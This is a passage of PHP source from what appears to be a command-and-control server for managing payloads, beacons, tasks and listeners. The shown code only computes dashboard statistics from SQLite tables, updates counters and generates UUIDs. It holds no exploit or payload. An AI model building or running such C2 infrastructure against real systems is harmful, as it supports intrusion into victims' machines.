        $res = $this->db->query("SELECT * FROM c2_stats");
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
            $stats[$row['key']] = $row['value'];
        }
        $stats['payloads_active'] = $this->db->querySingle("SELECT COUNT(*) FROM payloads WHERE status='active' AND (expires_at IS NULL OR expires_at > " . time() . ")");
        $stats['payloads_total'] = $this->db->querySingle("SELECT COUNT(*) FROM payloads");
        $stats['beacons_today'] = $this->db->querySingle("SELECT COUNT(*) FROM beacons WHERE beacon_time > " . (time() - 86400));
        $stats['tasks_pending'] = $this->db->querySingle("SELECT COUNT(*) FROM tasks WHERE status='pending' AND (expires_at IS NULL OR expires_at > " . time() . ")");
        $stats['tasks_completed'] = $this->db->querySingle("SELECT COUNT(*) FROM tasks WHERE status='completed'");
        $stats['listeners_running'] = $this->db->querySingle("SELECT COUNT(*) FROM listeners WHERE status='running'");
        $stats['files_total'] = $this->db->querySingle("SELECT COUNT(*) FROM files");
        return $stats;
    }

    private function updateStat($key, $delta) {
        $stmt = $this->db->prepare("
            INSERT INTO c2_stats (key, value, updated_at)
            VALUES (:key, :val, :time)
            ON CONFLICT(key) DO UPDATE SET
                value = CASE
                    WHEN :val LIKE '+%' THEN CAST(value AS INTEGER) + CAST(SUBSTR(:val,2) AS INTEGER)
                    WHEN :val LIKE '-%' THEN CAST(value AS INTEGER) - CAST(SUBSTR(:val,2) AS INTEGER)
                    ELSE :val
                END,
                updated_at = :time
        ");
        if (!$stmt) return;
        $stmt->bindValue(':key', $key, SQLITE3_TEXT);
        $stmt->bindValue(':val', $delta, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->execute();
    }

    // ========== UTILITY ==========
    private function generateUUID() {
        $data = random_bytes(16);
        $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
        $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    }

    private function getExternalIP() {
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}
